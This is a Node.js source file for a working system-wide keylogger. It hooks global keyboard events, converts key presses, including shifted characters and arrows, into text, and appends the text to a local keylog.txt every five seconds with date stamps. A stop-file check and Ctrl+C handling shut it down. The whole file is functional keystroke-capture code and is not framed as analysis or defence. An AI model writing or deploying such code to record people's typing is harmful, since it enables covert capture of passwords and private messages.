const fs = require('fs');
const { GlobalKeyboardListener } = require('node-global-key-listener');

// Create a write stream for the key log file
const logStream = fs.createWriteStream('keylog.txt', { flags: 'a' });

// Function to get the current date
function getCurrentDate() {
    const now = new Date();
    return `${now.toLocaleDateString()}`;
}

// Initialize a buffer for raw characters
let buffer = '';

// Function to write buffer to file
function writeBufferToFile() {
    if (buffer.length > 0) {
        logStream.write(buffer);
        buffer = '';
    }
}

// Function to check if the log file needs a newline before writing the date
function ensureNewlineBeforeDate() {
    try {
        // Read the last part of the file to see if it ends with a newline
        const fileContent = fs.readFileSync('keylog.txt', { encoding: 'utf-8' });
        const lastChar = fileContent.slice(-1);
        
        // Check if the last character is not a newline
        if (lastChar !== '\n') {
            logStream.write('\n'); // Add a newline if it's missing
        }
    } catch (error) {
        // If the file doesn't exist or there's an error, handle it gracefully
        console.error(`Error checking file for newline: ${error.message}`);
    }
}

// Set up the global key listener
const keyboard = new GlobalKeyboardListener();

// List of keys to log
const keysToLog = new Set([
    'SPACE', 'ENTER', 'BACKSPACE', 'DOT', 'QUOTE', 'MINUS', 'EQUALS', 'COMMA', 'DIVIDE', 'MULTIPLY'
]);

// Map of special keys to human-readable strings
const specialKeysMap = {
    'SPACE': ' ',
    'ENTER': '\n',
    'RETURN': '\n',
    'BACKSPACE': '[BACKSPACE]',
    'DOT': '.',
    'SEMICOLON': ';',
    'QUOTE': '\'',
    'MINUS': '-',
    'EQUALS': '=',
    'COMMA': ',',
    'DIVIDE': '/',
    'MULTIPLY': '*',
    'NUMPAD0': '0',
    'NUMPAD1': '1',
    'NUMPAD2': '2',
    'NUMPAD3': '3',
    'NUMPAD4': '4',
    'NUMPAD5': '5',
    'NUMPAD6': '6',
    'NUMPAD7': '7',
    'NUMPAD8': '8',
    'NUMPAD9': '9',
    'UP': ' ↑ ',
    'DOWN': ' ↓ ',
    'LEFT': ' ← ',
    'RIGHT': ' → ',
    'LEFT ARROW': ' ← ',
    'RIGHT ARROW': ' → ',
    'DOWN ARROW': ' ↓ ',
    'UP ARROW': ' ↑ '
};

// Map of keys when Shift is pressed
const shiftKeysMap = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    'MINUS': '_',
    'EQUALS': '+',
    'COMMA': '<',
    'DOT': '>',
    'QUOTE': '\"',
    'SEMICOLON': ':',
    'SLASH': '?',
    'BACKSLASH': '|',
    'BRACKETLEFT': '{',
    'BRACKETRIGHT': '}'
};

// Variable to keep track of whether the Shift key is pressed
let isShiftPressed = false;

// List of keys to ignore
const ignoreKeys = new Set([
    'LEFT ALT', 'RIGHT ALT', 'TAB', 'INSERT', 'DELETE', 'HOME', 'END', 'PAGE UP', 'PAGE DOWN', 'PAUSE', 'SCROLL LOCK', 'PRINT SCREEN', 'LEFT META', 'RIGHT META',
    'MOUSE LEFT', 'LEFT CTRL', 'RIGHT CTRL', 'LEFT SHIFT', 'RIGHT SHIFT', 'ESCAPE', 'MOUSE RIGHT'
]);

let lastLoggedDate = getCurrentDate();

// Ensure proper formatting before writing the first date
ensureNewlineBeforeDate();
logStream.write(`${lastLoggedDate}\n`);

keyboard.addListener((event) => {
    if (event.state === 'DOWN' && !ignoreKeys.has(event.name)) {
        if (keysToLog.has(event.name)) {
            if (event.name === 'BACKSPACE') {
                buffer = buffer.slice(0, -1); // Remove the last character from the buffer
            } else {
                buffer += specialKeysMap[event.name]; // Add special key representation
            }
        } else if (isShiftPressed && shiftKeysMap[event.name]) {
            buffer += shiftKeysMap[event.name]; // Add Shift-modified character
        } else if (specialKeysMap[event.name]) {
            buffer += specialKeysMap[event.name]; // Add mapped special key character
        } else if (event.rawcode >= 65 && event.rawcode <= 90) { // A-Z
            buffer += isShiftPressed ? event.name : event.name.toLowerCase(); // Add uppercase or lowercase letter
        } else if (event.rawcode >= 48 && event.rawcode <= 57) { // 0-9
            buffer += event.name; // Add number
        } else {
            buffer += isShiftPressed ? event.name : event.name.toLowerCase(); // Add any other character
        }
    } else if (event.name === 'LEFT SHIFT' || event.name === 'RIGHT SHIFT') {
        isShiftPressed = event.state === 'DOWN';
    }
});

// Periodically write buffer to file every 5 seconds and add date if it has changed
setInterval(() => {
    // Check if stop.txt exists
    if (fs.existsSync('stop.txt')) {
        console.log('Stop file detected. Keylogger is shutting down.');
        writeBufferToFile();
        process.exit();
    }

    const currentDate = getCurrentDate();
    if (currentDate !== lastLoggedDate) {
        ensureNewlineBeforeDate();
        logStream.write(`\n${currentDate}\n`);
        lastLoggedDate = currentDate;
    }
    writeBufferToFile();
}, 5000);

// Handle graceful shutdown on Ctrl+C
process.on('SIGINT', () => {
    writeBufferToFile(); // Write any remaining buffer content to the file
    process.exit(); // Exit the process
});
